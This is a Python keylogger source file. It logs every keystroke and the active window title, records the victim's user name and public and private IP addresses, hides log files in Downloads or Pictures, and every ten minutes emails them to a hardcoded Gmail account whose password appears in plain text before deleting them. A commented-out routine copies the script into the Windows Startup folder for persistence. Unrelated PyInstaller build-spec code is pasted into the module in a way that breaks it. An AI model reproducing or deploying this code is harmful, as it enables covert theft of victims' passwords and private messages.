#//python keylogging program

#imports
import shutil
import dlib
import face_recognition
from PyInstaller.building.api import EXE, PYZ
from PyInstaller.building.build_main import Analysis
from PyInstaller.building.datastruct import Tree
from pynput.keyboard import Key,Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config
import winreg as reg
from os import path
import os
import webbrowser
import locale
import getpass



a_website = r"https://www.google.com/"
datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())
#res = requests.get(r'https://www.tracemyip.org/').text


msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'

logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []
block_cipher = None

face_models = [
('.\\face_recognition_models\\models\\dlib_face_recognition_resnet_model_v1.dat', './face_recognition_models/models'),
('.\\face_recognition_models\\models\\mmod_human_face_detector.dat', './face_recognition_models/models'),
('.\\face_recognition_models\\models\\shape_predictor_5_face_landmarks.dat', './face_recognition_models/models'),
('.\\face_recognition_models\\models\\shape_predictor_68_face_landmarks.dat', './face_recognition_models/models'),
]

a = Analysis(['<your python script name.py>'],
             pathex=['<path to working directory>'],
             binaries=face_models,
             datas=[],
             hiddenimports=['scipy._lib.messagestream', 'scipy', 'scipy.signal', 'scipy.signal.bsplines', 'scipy.special', 'scipy.special._ufuncs_cxx',
                            'scipy.linalg.cython_blas',
                            'scipy.linalg.cython_lapack',
                            'scipy.integrate',
                            'scipy.integrate.quadrature',
                            'scipy.integrate.odepack',
                            'scipy.integrate._odepack',
                            'scipy.integrate.quadpack',
                            'scipy.integrate._quadpack',
                            'scipy.integrate._ode',
                            'scipy.integrate.vode',
                            'scipy.integrate._dop', 'scipy._lib', 'scipy._build_utils','scipy.__config__',
                            'scipy.integrate.lsoda', 'scipy.cluster', 'scipy.constants','scipy.fftpack','scipy.interpolate','scipy.io','scipy.linalg','scipy.misc','scipy.ndimage','scipy.odr','scipy.optimize','scipy.setup','scipy.sparse','scipy.spatial','scipy.special','scipy.stats','scipy.version'],

             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)

a.datas += Tree('./scipy-extra-dll', prefix=None)

pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='<your python script name>',
          debug=False,
          strip=False,
          upx=True,
          runtime_tmpdir=None,
          console=True )

def on_press(key):
	global old_app

	new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

	if new_app == 'Cortana':
		new_app = 'Windows Start Menu'
	else:
		pass
	
	
	if new_app != old_app and new_app != '':
		logged_data.append(f'[{datetime}] ~ {new_app}\n')
		old_app = new_app
	else:
		pass


	substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

	key = str(key).strip('\'')
	if key in substitution:
		logged_data.append(substitution[substitution.index(key)+1])
	else:
		logged_data.append(key)
"""
def copy_self():
	if path.exists(r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Python advanced keylogger.pyw'.format(user)):
		pass
	else:
		shutil.copy(__file__, r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(user))
"""
def write_file(count):
	one = os.path.expanduser('~') + '/Downloads/'
	two = os.path.expanduser('~') + '/Pictures/'
	#three = 'C:/'
	list = [one,two]

	filepath = random.choice(list)
	filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
	file = filepath + filename
	delete_file.append(file)


	with open(file,'w') as fp:
		fp.write(''.join(logged_data))
	print('written all good')

def send_logs():
	count = 0

	fromAddr = 'xthatwhiteguy@gmail.com'
	fromPswd = 'nick4000'
	toAddr = fromAddr

	MIN = 10
	SECONDS = 60
	#time.sleep(MIN * SECONDS) # every 10 mins write file/send log
	time.sleep(30) # for debugging ~ yes program works :)
	while True:
		if len(logged_data) > 1:
			try:
				write_file(count)

				subject = f'[{user}] ~ {count}'

				msg = MIMEMultipart()
				msg['From'] = fromAddr
				msg['To'] = toAddr
				msg['Subject'] = subject
				body = 'New Log File'
				msg.attach(MIMEText(body,'plain'))

				attachment = open(delete_file[0],'rb')
				print('attachment')

				filename = delete_file[0].split('/')[2]

				part = MIMEBase('application','octect-stream')
				part.set_payload((attachment).read())
				encoders.encode_base64(part)
				part.add_header('content-disposition','attachment;filename='+str(filename))
				msg.attach(part)

				text = msg.as_string()
				print('test msg.as_string')

				s = smtplib.SMTP('smtp.gmail.com',587)
				s.ehlo()
				s.starttls()
				print('starttls')
				s.ehlo()
				s.login(fromAddr,fromPswd)
				s.sendmail(fromAddr,toAddr,text)
				print('sent mail')
				attachment.close()
				s.close()

				os.remove(delete_file[0])
				del logged_data[1:]
				del delete_file[0:]
				print('delete data/files')

				count += 1
				time.sleep(600)

			except Exception as errorString:
				print('[!] send_logs // Error.. ~ %s' % (errorString))
				pass


if __name__=='__main__':
	T1 = threading.Thread(target=send_logs)
	T1.start()
	with Listener(on_press=on_press) as listener:
		listener.join()
